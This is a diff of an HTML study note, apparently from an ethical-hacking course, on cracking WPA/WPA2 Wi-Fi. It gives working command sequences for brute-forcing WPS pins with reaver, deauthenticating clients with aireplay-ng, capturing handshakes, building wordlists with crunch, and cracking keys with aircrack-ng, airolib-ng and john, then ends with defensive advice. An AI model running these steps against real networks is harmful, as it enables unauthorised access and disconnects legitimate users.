@@ -1,6 +1,7 @@
-<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
 <head>
-<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <title>WPA/WPA2</title>
 </head><body><b><span style="font-size: 12pt">WPA/WPA2 CRACKING:<br/>
 <br/>
@@ -10,7 +11,7 @@
 -Each packet is encrypted using a unique temporary key<br/>
 -Packets contain no useful information<br/>
 <br/>
---&gt;Only packets that can aid with the cracking process are<b>the handshake packets, </b>These are 4 packets sent when a client connects to the network<br/>
+--&gt;Only packets that can aid with the cracking process are<b>&nbsp;the handshake packets, </b>These are 4 packets sent when a client connects to the network<br/>
 <br/>
 --&gt;the only difference between WPA and WPA2 is the encryption used to ensure message integrity WPA uses TKIP and WPA2 uses CCMP<br/>
 <br/>
@@ -20,18 +21,19 @@
 </b>-WPS(Wifi-Protected-Setup) is a feature that can be used with WPA&amp;WPA2<br/>
 -Allows clients to connect without the password (it's designed to simplify the process of connecting printers and cameras etc)<br/>
 -Authentication is done using an 8 digit pin<br/>
- -8 Digits is very small<br/>
- -We can try all possible pins in relatively short time<br/>
- -Once we get the pin we can use it to compute actual password of WPA/WPA2, we need WPS to be enable and also needs to be misconfigured so it needs to be configured to use a normal pin authentication and not PBC(Push Button Authentication)<br/>
+&nbsp; -8 Digits is very small<br/>
+&nbsp; -We can try all possible pins in relatively short time<br/>
+&nbsp; -Once we get the pin we can use it to compute actual password of WPA/WPA2, we need WPS to be enable and also needs to be misconfigured so it needs to be configured to use a normal pin authentication and not PBC(Push Button Authentication)<br/>
 <br/>
 <br/>
 <b>Hack WPS:<br/>
 <br/>
-</b>#wash --interface wlan0 (to see which network have WPS enabled)<br/>
+</b>#wash --interface wlan0mon (to see which network have WPS enabled)<br/>
 #aireplay-ng --fakeauth 30 -a [BSSID] -h [MAC adapter] wlan0 (30 means we associate with target network every 30 seconds)<br/>
 ----------------------------------------------------------------------------------<br/>
 in another shell:<br/>
-#ifconfig (to know MAC address of your wifi adapter, it's first 12 digits after the &quot;unspec&quot;)<br/>
+<br/>
+#ifconfig (to know MAC address of your wifi adapter, it's first 12 digits after the "unspec")<br/>
 #reaver --bssid [MAC of bssid] --channel [num of channel] --interface wlan0 -vvv --no-associate<br/>
 (brute force the pin, try every possible pin to find right one to compute the actual WPA/WPA2 key, -vvv show as much information, --no-associate because we already doing that)<br/>
 <br/>
@@ -50,20 +52,20 @@ in another shell:<br/>
 <br/>
 </b>#airodump-ng wlan0<br/>
 <br/>
-ex target network is MAC: D8:29:18:08:B3:28  channel is: 1 <br/>
+ex target network is &nbsp;MAC: D8:29:18:08:B3:28 &nbsp; &nbsp;channel is: 1 &nbsp;<br/>
 <br/>
 #airodump-ng --bssid D8:29:18:08:B3:28 --channel 1 --write wpa3_handshake wlan0 <br/>
 (we wait to the handshake to be captured, but we can use Deauthentication attack to disconnect a client from the network for very short period of time, he automatically connect once we stop the attack and the handshake will be sent in the air)<br/>
 ---------------------------------------------------------------------------------------------------------<br/>
 another shell:<br/>
-#aireplay-ng --deauth 4 -a D8:29:18:08:B3:28 -c 20:D3:90:A6:5B:1C wlan0 <br/>
+#aireplay-ng --deauth 4 -a D8:29:18:08:B3:28 -c 20:D3:90:A6:5B:1C wlan0 &nbsp;<br/>
 (20:D3:90:A6:5B:1C is station in network)<br/>
 #aircrack-ng wpa3_handshake-01.cap -w wordlist.txt wlan0<br/>
 <br/>
 <br/>
 <b>Handshake:<br/>
 <br/>
-</b>-The handshake does <b>not</b>contain data that helps recover the password<br/>
+</b>-The handshake does <b>not</b>&nbsp;contain data that helps recover the password<br/>
 -It contains data that can be used to <b>check </b>weather a key is valid or not,<br/>
 Therefore we are going to create a wordlist which big text file that contains a large number of passwords<br/>
 <br/>
@@ -78,10 +80,10 @@ ex:<br/>
 &gt;crunch 6 10 123abc$*-+ -t a@@@@b -o wordlist.txt<br/>
 <br/>
 <br/>
-<b>Note: </b>in many scenarios will have AP that doesn't have any clients connected to it so we have to wait until someone connects to the access point to capture the handshake, we can actually save time by converting our wordlist to PMK(each password in the wordlist with AP name(essid) to compute a pairwise Master key (PMK) using the pbkdf2 algoritm, the PMK is the compared to the handshake file), so while we're waiting, we can change each password in the list and create a new PMK list from our word list and then once we capture the handshake we can use our ready PMKs <br/>
+<b>Note: </b>in many scenarios will have AP that doesn't have any clients connected to it so we have to &nbsp;wait until someone connects to the access point to capture the handshake, we can actually save time by converting our wordlist to PMK(each password in the wordlist with AP name(essid) to compute a pairwise Master key (PMK) using the pbkdf2 algoritm, the PMK is the compared to the handshake file), &nbsp;so while we're waiting, we can change each password in the list and create a new PMK list from our word list and then once we capture the handshake we can use our ready PMKs <br/>
 <br/>
 #airolib-ng test-db --import passwd wordlist<br/>
-#echo &quot;Ameno&quot; &gt; test-essid (test-essid is the name of the file)<br/>
+#echo "Ameno" &gt; test-essid (test-essid is the name of the file)<br/>
 #airolib-ng test-db --import essid test-essid<br/>
 #airolib-ng test-db --batch<br/>
 #aircrack-ng -r test-db wpa_handshake-01.cap<br/>
@@ -98,9 +100,18 @@ We can speed up the cracking process using a tool called hashcat which uses the 
 2-To use it we need to change the handshake file format to hccap, we can do this using:<br/>
 https://hashcat.net/cap2hccap<br/>
 <br/>
+<b>Note: </b>We are going to use aircrack-ng to crack the key. it does this by combining each password in the wordlist with AP name(essid) to compute a Pairwise Master Key (PMK) using the pbkdf2 algorithm, the PMK is compared to the handshake file.<br/>
+<br/>
+<b>Saving Cracking Progress:<br/>
+<br/>
+</b>--&gt;aircrack-ng doesn't save where it reached in the previous cracking session so we using john<br/>
+<br/>
+#john --wordlist=wpa-wordlist --stdout --session=ameno | aircrack-ng -w - -b [MAC target network] handshake-01.cap (handshake-01.cap and wpa-wordlist should be in rood directory)<br/>
+q<br/>
+#john --restore=ameno | aircrack-ng -w - -b [MAC target network] handshake-01.cap<b><br/>
+</b><br/>
 <br/>
 <b>Conclusion:</b><br/>
-<br/>
 <br/>
 1.Do not use WEP encryption, as we seen how easy it is to crack it regardless of the complexity of the password and even if there is nobody connected to the network.<br/>
 <br/>
